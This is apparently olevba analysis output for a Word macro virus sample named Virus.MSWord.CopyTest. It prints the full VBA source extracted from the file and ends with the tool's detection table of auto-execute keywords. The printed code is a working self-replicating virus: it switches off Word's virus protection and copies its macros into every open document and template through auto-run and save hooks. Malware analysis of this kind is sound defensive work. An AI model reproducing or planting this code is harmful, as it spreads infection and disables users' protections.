olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.CopyTest
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Infect.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/Infect'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    
    myname = ThisDocument.FullName
    Word.Options.VirusProtection = False
    
    For Each d In Word.Documents
        If (d.FullName <> myname) Then
            Debug.Print myname + " -> " + d.FullName
            Call CopyMacros(myname, d.FullName)
        End If
    Next d
    
    For Each t In Word.Templates
        If (t.FullName <> myname) Then
            Call CopyMacros(myname, t.FullName)
        End If
    Next t
    Rem Application.OrganizerCopy "d:\test2.doc", "d:\test1.doc", "Test", 3
End Sub

Sub CopyMacros(ByVal s As String, ByVal d As String)
    On Error GoTo AlreadyInfected

    Application.OrganizerCopy s, d, "Infect", wdOrganizerObjectProjectItems
    Application.OrganizerCopy s, d, "AutoClose", wdOrganizerObjectProjectItems
    Application.OrganizerCopy s, d, "AutoExec", wdOrganizerObjectProjectItems
    Application.OrganizerCopy s, d, "AutoOpen", wdOrganizerObjectProjectItems
    Application.OrganizerCopy s, d, "AutoExit", wdOrganizerObjectProjectItems
    Application.OrganizerCopy s, d, "FileClose", wdOrganizerObjectProjectItems
    Application.OrganizerCopy s, d, "FileSave", wdOrganizerObjectProjectItems
    Application.OrganizerCopy s, d, "FileSaveAs", wdOrganizerObjectProjectItems

AlreadyInfected:
End Sub

Sub SaveDoc()
    If (Application.ActiveDocument.Saved = False) Then
        If (Application.ActiveDocument.Path <> "") Then
            Application.ActiveDocument.Save
        End If
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    Infect.MAIN
    Infect.SaveDoc
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    Infect.MAIN
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    Infect.MAIN
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    Infect.MAIN
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    Infect.MAIN
    Infect.SaveDoc
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    Infect.MAIN
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.CopyTest - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
    Infect.MAIN
    Word.Dialogs(wdDialogFileSaveAs).Show
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

